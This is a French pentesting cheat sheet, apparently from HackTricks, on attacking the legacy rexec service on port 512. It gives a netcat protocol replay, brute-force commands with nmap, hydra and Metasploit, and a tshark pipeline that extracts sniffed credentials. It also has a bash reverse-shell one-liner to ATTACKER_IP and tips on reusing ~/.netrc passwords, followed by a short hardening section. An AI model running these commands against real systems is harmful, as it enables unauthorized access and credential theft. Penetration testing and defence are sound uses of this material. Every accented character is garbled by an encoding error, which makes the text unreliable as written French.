# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Informations de base

Rexec (remote **exec**) est l'un des services *r* originaux de Berkeley (avec `rlogin`, `rsh`, ‚Ä¶). Il fournit une capacit√© de **commande √† distance** **authentifi√©e uniquement avec un nom d'utilisateur et un mot de passe en clair**. Le protocole a √©t√© d√©fini au d√©but des ann√©es 1980 (voir RFC 1060) et est aujourd'hui consid√©r√© comme **insecure par conception**. N√©anmoins, il est toujours activ√© par d√©faut dans certains √©quipements UNIX / connect√©s en r√©seau h√©rit√©s et appara√Æt parfois lors de pentests internes.

**Port par d√©faut :** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> üî• Tout le trafic ‚Äì y compris les identifiants ‚Äì est transmis **non chiffr√©**. Quiconque a la capacit√© de renifler le r√©seau peut r√©cup√©rer le nom d'utilisateur, le mot de passe et la commande.

### Aper√ßu rapide du protocole

1. Le client se connecte au TCP 512.
2. Le client envoie trois cha√Ænes **termin√©es par NUL** :
* le num√©ro de port (en ASCII) o√π il souhaite recevoir stdout/stderr (souvent `0`),
* le **nom d'utilisateur**,
* le **mot de passe**.
3. Une derni√®re cha√Æne termin√©e par NUL avec la **commande** √† ex√©cuter est envoy√©e.
4. Le serveur r√©pond avec un seul octet d'√©tat de 8 bits (0 = succ√®s, `1` = √©chec) suivi de la sortie de la commande.

Cela signifie que vous pouvez reproduire l'√©change avec rien de plus que `echo -e` et `nc` :
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
Si les identifiants sont valides, vous recevrez la sortie de `id` directement sur la m√™me connexion.

### Utilisation manuelle avec le client

De nombreuses distributions Linux incluent encore le client h√©rit√© dans le package **inetutils-rexec** / **rsh-client** :
```bash
rexec -l user -p password <target> "uname -a"
```
Si `-p` est omis, le client demandera le mot de passe de mani√®re interactive (visible sur le r√©seau en texte clair !).

---
## √ânum√©ration & Brute-forcing

### [**Brute-force**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
Le `rexec-brute` NSE utilise le protocole d√©crit ci-dessus pour essayer des identifiants tr√®s rapidement.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` a un module **rexec** d√©di√© et reste le bruteforceur hors ligne le plus rapide. `medusa` (`-M REXEC`) et `ncrack` (module `rexec`) peuvent √™tre utilis√©s de la m√™me mani√®re.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
Le module lancera un shell en cas de succ√®s et stockera les identifiants dans la base de donn√©es.

---
## Sniffing credentials

Parce que tout est en texte clair, **les captures r√©seau sont inestimables**. Avec une copie du trafic, vous pouvez extraire des identifiants sans toucher √† la cible :
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark, activez *Decode As ‚Ä¶‚Äã* TCP 512 ‚Üí REXEC pour voir les champs bien analys√©s.)

---
## Conseils post-exploitation

* Les commandes s'ex√©cutent avec les privil√®ges de l'utilisateur fourni. Si `/etc/pam.d/rexec` est mal configur√© (par exemple `pam_rootok`), des shells root sont parfois possibles.
* Rexec ignore le shell de l'utilisateur et ex√©cute la commande via `/bin/sh -c <cmd>`. Vous pouvez donc utiliser des astuces d'√©chappement de shell typiques (`;`, ``$( )``, backticks) pour encha√Æner plusieurs commandes ou cr√©er des shells invers√©s :
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* Les mots de passe sont souvent stock√©s dans **~/.netrc** sur d'autres syst√®mes ; si vous compromettez un h√¥te, vous pouvez les r√©utiliser pour un mouvement lat√©ral.

---
## Renforcement / D√©tection

* **Ne pas exposer rexec** ; remplacez-le par SSH. Virtuellement tous les *inetd* superservers modernes commentent le service par d√©faut.
* Si vous devez le garder, restreignez l'acc√®s avec des wrappers TCP (`/etc/hosts.allow`) ou des r√®gles de pare-feu et imposez des mots de passe forts par compte.
* Surveillez le trafic vers :512 et les lancements de processus `rexecd`. Une seule capture de paquet suffit pour d√©tecter une compromission.
* D√©sactivez `rexec`, `rlogin`, `rsh` ensemble ‚Äì ils partagent la plupart du m√™me code et des faiblesses.

---

## R√©f√©rences

* Documentation Nmap NSE `rexec-brute` ‚Äì [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* Module Rapid7 Metasploit `auxiliary/scanner/rservices/rexec_login` ‚Äì [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
